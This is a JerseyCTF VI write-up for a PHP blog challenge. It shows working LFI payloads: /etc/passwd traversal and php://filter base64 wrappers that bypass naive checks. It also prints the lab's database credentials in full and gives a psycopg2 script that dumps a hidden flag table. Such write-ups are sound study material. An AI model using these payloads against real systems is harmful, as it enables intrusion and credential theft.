# my-cool-blog - JerseyCTF VI Writeup

**Description :** "Check out my new, cool blog!  
http://my-cool-blog.aws.jerseyctf.com"

---

## 1. TL;DR
This challenge involved a classic **Local File Inclusion (LFI)** vulnerability that was guarded by custom PHP filters. By leveraging the `php://filter/convert.base64-encode` wrapper, we bypassed both a directory prefix check and a string content check (`pg_connect`). This allowed us to extract the database configuration file (`db.inc`), revealing PostgreSQL credentials. Finally, connecting directly to the external database allowed us to dump a hidden `flag` table and retrieve the flag.

---

## 2. What data/file we have and what is special
**The Target:** A simple blog site containing 3 basic posts.
**The Vulnerable Parameter:** The posts are loaded via a `file` parameter in the URL: `http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=posts/cool-post-1`.

**Interactive LFI Discovery:**
If a user modifies the `file` parameter to `../../../../../../../../etc/passwd`, the server responds with the contents of the `/etc/passwd` file, confirming LFI.
```http
GET /view-post.php?file=../../../../../../../../etc/passwd HTTP/1.1
Host: my-cool-blog.aws.jerseyctf.com

<main>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
</main>
```

---

## 3. Problem Analysis (in details)
While we had basic LFI to read system files, standard flag locations (like `/flag.txt` or `../flag.php`) returned nothing. 

To dig deeper, we used **PHP Filters** to extract the server's own source code. Instead of executing the PHP files, we forced the server to base64-encode them. 
Payload used: `?file=php://filter/convert.base64-encode/resource=view-post.php`.

Decoding the result gave us the actual source code of `view-post.php`, which revealed two explicit security checks acting as a mini-WAF:

```php
<?php
$filename = $_GET['file'];

if (str_starts_with($filename, 'includes')) {
  echo ('Error: Access to includes directory disallowed.');
} else {
  $post_raw = file_get_contents($filename);
  
  if (str_contains($post_raw, base64_decode('cGdfY29ubmVjdA=='))) {
    echo ('Error: File contains sensitive information (pg connect function).');
  } else {
    echo ($post_raw);
  }
}
```

**The Roadblocks:**
1. **Directory Block:** We cannot start our payload with `includes`. (And we know from reading `index.php` that a file called `includes/db.inc` exists).
2. **Content Block:** The server reads the file into memory (`$post_raw`). If the file contains `pg_connect` (which `cGdfY29ubmVjdA==` decodes to), it blocks the output.

---

## 4. Initial Guesses / First Try
* **Attempt 1:** Standard Path Traversal (`../../../../etc/passwd`). *Result:* Worked, confirming LFI, but no flag.
* **Attempt 2:** Guessing flag locations (`/flag.txt`, `/opt/server/flag.php`, `/home/noah/flag.txt`). *Result:* All 404s or empty.
* **Attempt 3:** Direct read of the DB config (`?file=includes/db.inc`). *Result:* Blocked by the `str_starts_with` check.
* **Attempt 4:** Path traversal to the DB config (`?file=posts/../includes/db.inc`). *Result:* Blocked by the `str_contains` check because the file contains the `pg_connect` string.

---

## 5. Exploitation Walkthrough / Flag Recovery

### Step 1: Bypassing the Filters
To read `includes/db.inc`, we needed to bypass both checks. The `php://filter` wrapper is perfect for this:
* **Bypass 1:** By starting the payload with `php://`, the string does *not* start with `includes`, bypassing the `str_starts_with` check.
* **Bypass 2:** By applying `convert.base64-encode`, the file is encoded *before* the `str_contains` check occurs. The string `pg_connect` is turned into base64 jargon, so the check fails to detect it.

**Payload:**
```text
http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=php://filter/convert.base64-encode/resource=includes/db.inc
```

### Step 2: Extracting Credentials
The server happily returned the base64 encoded content of `db.inc`:
```text
PD9waHAKJGRiID0gcGdfY29ubmVjdCgnaG9zdD1teS1jb29sLWJsb2cuYXdzLmplcnNleWN0Zi5jb20gZGJuYW1lPWJsb2cgdXNlcj1ibG9nX3dlYiBwYXNzd29yZD1vUFBOUTl2a01kQUp4JykKICAgIG9yIGRpZSgnQ291bGQgbm90IGNvbm5lY3Q6ICcgLiBwZ19sYXN0X2Vycm9yKCkpOw==
```

Decoding this in the terminal:
```bash
echo "PD9waHAKJGRi..." | base64 -d
```
Revealed the database credentials:
```php
<?php
$db = pg_connect('host=my-cool-blog.aws.jerseyctf.com dbname=blog user=blog_web password=oPPNQ9vkMdAJx')
    or die('Could not connect: ' . pg_last_error());
```

### Step 3: Remote Database Connection
We discovered the database is hosted on the same domain and is publicly accessible. We wrote a quick Python script using `psycopg2-binary` to connect to the DB and explore its contents.

```python
import psycopg2

print("[*] Connecting to the database...")
conn = psycopg2.connect(
    host="my-cool-blog.aws.jerseyctf.com",
    database="blog",
    user="blog_web",
    password="oPPNQ9vkMdAJx"
)
cur = conn.cursor()

# 1. Look for tables
cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public';")
print(f"[+] Tables found: {cur.fetchall()}")

# 2. Dump the flag table
print("\n[*] Dumping 'flag' table:")
cur.execute("SELECT * FROM flag;")
print(cur.fetchall())
```

### Step 4: Pwning the Database
Running the script yielded the hidden table and the flag!

```text
[*] Connecting to the database...
[+] Tables found:[('posts',), ('flag',)]

[*] Dumping 'flag' table:[('jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}',)]
```

**Flag:** `jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}`

---

## 6. What We Learned
1. **PHP Filters are incredibly powerful.** They aren't just for reading unexecuted PHP code; they can fundamentally alter the content of a file in memory to bypass naive string-matching WAFs (Web Application Firewalls).
2. **Order of Operations matters.** Because `file_get_contents` processed the base64 wrapper *before* assigning it to `$post_raw`, the `str_contains` check evaluated the encoded text, rendering the security check useless.
3. **External Database Exposure.** Web credentials often lead to further exploitation if the database port (e.g., PostgreSQL 5432) is left exposed to the public internet. Always check if the DB is reachable remotely during a CTF!